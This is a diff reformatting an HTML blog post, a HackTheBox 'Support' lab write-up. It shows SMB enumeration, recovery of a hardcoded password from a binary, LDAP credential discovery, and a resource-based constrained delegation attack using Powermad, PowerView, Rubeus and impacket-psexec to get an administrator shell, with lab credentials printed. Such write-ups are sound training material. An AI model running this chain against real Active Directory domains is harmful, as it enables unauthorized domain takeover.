@@ -1,4 +1,112 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as support</u></strong></span></p><p>&nbsp;</p><p>smb allows us to download shares</p><p>&nbsp;</p><p>Sharename &nbsp; &nbsp; &nbsp; Type &nbsp; &nbsp; &nbsp;Comment<br>&nbsp;&nbsp;&nbsp;&nbsp;--------- &nbsp; &nbsp; &nbsp; ---- &nbsp; &nbsp; &nbsp;-------<br>&nbsp;&nbsp;&nbsp;&nbsp;ADMIN$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Disk &nbsp; &nbsp; &nbsp;Remote Admin<br>&nbsp;&nbsp;&nbsp;&nbsp;C$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Disk &nbsp; &nbsp; &nbsp;Default share<br>&nbsp;&nbsp;&nbsp;&nbsp;IPC$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IPC &nbsp; &nbsp; &nbsp; Remote IPC<br>&nbsp;&nbsp;&nbsp;&nbsp;NETLOGON &nbsp; &nbsp; &nbsp; &nbsp;Disk &nbsp; &nbsp; &nbsp;Logon server share&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;support-tools &nbsp; Disk &nbsp; &nbsp; &nbsp;support staff tools<br>&nbsp;&nbsp;&nbsp;&nbsp;SYSVOL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Disk &nbsp; &nbsp; &nbsp;Logon server share&nbsp;<br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>smbclient //10.10.11.174/support-tools -c 'recurse;ls'</p><p>Password for [WORKGROUP\root]:<br>&nbsp;. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; D &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp;Wed Jul 20 13:01:06 2022<br>&nbsp;.. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;D &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp;Sat May 28 07:18:25 2022<br>&nbsp;7-ZipPortable_21.07.paf.exe &nbsp; &nbsp; &nbsp; &nbsp; A &nbsp;2880728 &nbsp;Sat May 28 07:19:19 2022<br>&nbsp;npp.8.4.1.portable.x64.zip &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;A &nbsp;5439245 &nbsp;Sat May 28 07:19:55 2022<br>&nbsp;putty.exe &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; A &nbsp;1273576 &nbsp;Sat May 28 07:20:06 2022<br>&nbsp;SysinternalsSuite.zip &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; A 48102161 &nbsp;Sat May 28 07:19:31 2022<br>&nbsp;UserInfo.exe.zip &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;A &nbsp; 277499 &nbsp;Wed Jul 20 13:01:07 2022<br>&nbsp;windirstat1_1_2_setup.exe &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; A &nbsp; &nbsp;79171 &nbsp;Sat May 28 07:20:17 2022<br>&nbsp;WiresharkPortable64_3.6.5.paf.exe &nbsp; &nbsp; &nbsp;A 44398000 &nbsp;Sat May 28 07:19:43 2022</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4026367 blocks of size 4096. 958078 blocks available<br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Located encrytped password and username within the userinfo.exe file</p><p><span style="color:rgb(220,220,220);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color:rgb(87,166,74);">//&nbsp;Token:&nbsp;0x04000005&nbsp;RID:&nbsp;5</span><br><span style="color:rgb(220,220,220);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color:rgb(86,156,214);">private</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(86,156,214);">static</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(86,156,214);">string</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(141,141,198);">enc_password</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(180,180,180);">=</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(214,157,133);">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span><span style="color:rgb(220,220,220);">;</span><br><br><span style="color:rgb(220,220,220);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color:rgb(87,166,74);">//&nbsp;Token:&nbsp;0x04000006&nbsp;RID:&nbsp;6</span><br><span style="color:rgb(220,220,220);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color:rgb(86,156,214);">private</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(86,156,214);">static</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(86,156,214);">byte</span><span style="color:rgb(220,220,220);">[]&nbsp;</span><span style="color:rgb(141,141,198);">key</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(180,180,180);">=</span><span style="color:rgb(220,220,220);">&nbsp;</span><span style="color:rgb(78,201,176);">Encoding</span><span style="color:rgb(180,180,180);">.</span><span style="color:rgb(31,142,142);">ASCII</span><span style="color:rgb(180,180,180);">.</span><span style="color:rgb(255,128,0);">GetBytes</span><span style="color:rgb(220,220,220);">(</span><span style="color:rgb(214,157,133);">"armando"</span><span style="color:rgb(220,220,220);">);</span></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span style="color:rgb(220,220,220);">Using chatgpt to decrypt the password&nbsp;</span></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:415/143;" src="../img/posts/2024-11-25-Support(HTB)/01-14c703f490.png" width="415" height="143"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I actually got stuck here as the password does not work for armando. I looked up a hint and this password is for the ldap user…?</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1233/283;" src="../img/posts/2024-11-25-Support(HTB)/02-00daa6ab3d.png" width="1233" height="283"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Finding supports password</p><p><code>ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"| grep -C 30 "sAMAccountName: support"</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1281/590;" src="../img/posts/2024-11-25-Support(HTB)/03-94f9807b6d.png" width="1281" height="590"></figure><p>&nbsp;</p><p>support:Ironside47pleasure40Watchful</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as admin</u></strong></span></p><p>&nbsp;</p><p>Support has generic all over the domain controller</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:238/296;" src="../img/posts/2024-11-25-Support(HTB)/04-f1afca2489.png" width="238" height="296"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:576/480;" src="../img/posts/2024-11-25-Support(HTB)/05-2eb0b965aa.png" width="576" height="480"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Following bloodhound we can exploit this.</p><p>&nbsp;</p><p>Commands to exploit this</p><pre><code class="language-text-plain">Import-Module .\Powermad.ps1
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Support | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-11-25-Support(HTB)/01-14c703f490.png" alt="HTB: Support cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Support</h1>
+                <div class="post-meta">November 25, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Shell as support</h1>
+
+        <p>smb allows us to download shares</p>
+
+        <p>Sharename       Type      Comment<br/>    ---------       ----      -------<br/>    ADMIN$          Disk      Remote Admin<br/>    C$              Disk      Default share<br/>    IPC$            IPC       Remote IPC<br/>    NETLOGON        Disk      Logon server share <br/>    support-tools   Disk      support staff tools<br/>    SYSVOL          Disk      Logon server share <br/> </p>
+
+        <p>smbclient //10.10.11.174/support-tools -c 'recurse;ls'</p>
+
+        <p>Password for [WORKGROUP\root]:<br/> .                                   D        0  Wed Jul 20 13:01:06 2022<br/> ..                                  D        0  Sat May 28 07:18:25 2022<br/> 7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022<br/> npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022<br/> putty.exe                           A  1273576  Sat May 28 07:20:06 2022<br/> SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022<br/> UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022<br/> windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022<br/> WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022</p>
+
+        <p>        4026367 blocks of size 4096. 958078 blocks available<br/> </p>
+
+        <p>Located encrytped password and username within the userinfo.exe file</p>
+
+        <p><span style="color:rgb(220,220,220);">        </span><span style="color:rgb(87,166,74);">// Token: 0x04000005 RID: 5</span><br/><span style="color:rgb(220,220,220);">        </span><span style="color:rgb(86,156,214);">private</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(86,156,214);">static</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(86,156,214);">string</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(141,141,198);">enc_password</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(180,180,180);">=</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(214,157,133);">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span><span style="color:rgb(220,220,220);">;</span><br/><br/><span style="color:rgb(220,220,220);">        </span><span style="color:rgb(87,166,74);">// Token: 0x04000006 RID: 6</span><br/><span style="color:rgb(220,220,220);">        </span><span style="color:rgb(86,156,214);">private</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(86,156,214);">static</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(86,156,214);">byte</span><span style="color:rgb(220,220,220);">[] </span><span style="color:rgb(141,141,198);">key</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(180,180,180);">=</span><span style="color:rgb(220,220,220);"> </span><span style="color:rgb(78,201,176);">Encoding</span><span style="color:rgb(180,180,180);">.</span><span style="color:rgb(31,142,142);">ASCII</span><span style="color:rgb(180,180,180);">.</span><span style="color:rgb(255,128,0);">GetBytes</span><span style="color:rgb(220,220,220);">(</span><span style="color:rgb(214,157,133);">"armando"</span><span style="color:rgb(220,220,220);">);</span></p>
+
+        <p><span style="color:rgb(220,220,220);">Using chatgpt to decrypt the password </span></p>
+
+        <img alt="Screenshot 1" height="143" src="../img/posts/2024-11-25-Support(HTB)/01-14c703f490.png" style="aspect-ratio:415/143;" width="415"/>
+
+        <p>I actually got stuck here as the password does not work for armando. I looked up a hint and this password is for the ldap user…?</p>
+
+        <img alt="Screenshot 2" height="283" src="../img/posts/2024-11-25-Support(HTB)/02-00daa6ab3d.png" style="aspect-ratio:1233/283;" width="1233"/>
+
+        <p>Finding supports password</p>
+
+        <pre class="terminal"><code>ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"| grep -C 30 "sAMAccountName: support"</code></pre>
+
+        <img alt="Screenshot 3" height="590" src="../img/posts/2024-11-25-Support(HTB)/03-94f9807b6d.png" style="aspect-ratio:1281/590;" width="1281"/>
+
+        <p>support:Ironside47pleasure40Watchful</p>
+
+        <h1 style="color:red;">Shell as admin</h1>
+
+        <p>Support has generic all over the domain controller</p>
+
+        <img alt="Screenshot 4" height="296" src="../img/posts/2024-11-25-Support(HTB)/04-f1afca2489.png" style="aspect-ratio:238/296;" width="238"/>
+
+        <img alt="Screenshot 5" height="480" src="../img/posts/2024-11-25-Support(HTB)/05-2eb0b965aa.png" style="aspect-ratio:576/480;" width="576"/>
+
+        <p>Following bloodhound we can exploit this.</p>
+
+        <p>Commands to exploit this</p>
+
+        <pre class="terminal"><code>Import-Module .\Powermad.ps1
 Import-Module ./PowerView.ps1
 New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
 $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
@@ -7,4 +115,28 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
-.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/DC.support.htb /ptt</code></pre><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:904/532;" src="../img/posts/2024-11-25-Support(HTB)/06-68e8ce18d8.png" width="904" height="532"></figure><p>&nbsp;</p><p>We copy the ticket and then decode it using base64</p><p><code>cat b64_ticket.txt | base64 -d &gt; ticket.kirbi</code></p><p>&nbsp;</p><p>Then we convert the kirbi ticket into a ccache</p><p><code>impacket-ticketConverter ticket.kirbi ticket1.ccache</code></p><p>&nbsp;</p><p>&nbsp;</p><p>Export the ticket</p><p><code>export KRB5CCNAME=ticket.ccache</code></p><p>&nbsp;</p><p>Remote in with FQDN and grab root.txt</p><p><code>impacket-psexec -k support.htb/administrator@dc.support.htb -no-pass</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:678/250;" src="../img/posts/2024-11-25-Support(HTB)/07-ca68feb388.png" width="678" height="250"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></body></html>
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/DC.support.htb /ptt</code></pre>
+
+        <img alt="Screenshot 6" height="532" src="../img/posts/2024-11-25-Support(HTB)/06-68e8ce18d8.png" style="aspect-ratio:904/532;" width="904"/>
+
+        <p>We copy the ticket and then decode it using base64</p>
+
+        <pre class="terminal"><code>cat b64_ticket.txt | base64 -d &gt; ticket.kirbi</code></pre>
+
+        <p>Then we convert the kirbi ticket into a ccache</p>
+
+        <pre class="terminal"><code>impacket-ticketConverter ticket.kirbi ticket1.ccache</code></pre>
+
+        <p>Export the ticket</p>
+
+        <pre class="terminal"><code>export KRB5CCNAME=ticket.ccache</code></pre>
+
+        <p>Remote in with FQDN and grab root.txt</p>
+
+        <pre class="terminal"><code>impacket-psexec -k support.htb/administrator@dc.support.htb -no-pass</code></pre>
+
+        <img alt="Screenshot 7" height="250" src="../img/posts/2024-11-25-Support(HTB)/07-ca68feb388.png" style="aspect-ratio:678/250;" width="678"/>
+    </article>
+
+</body>
+</html>
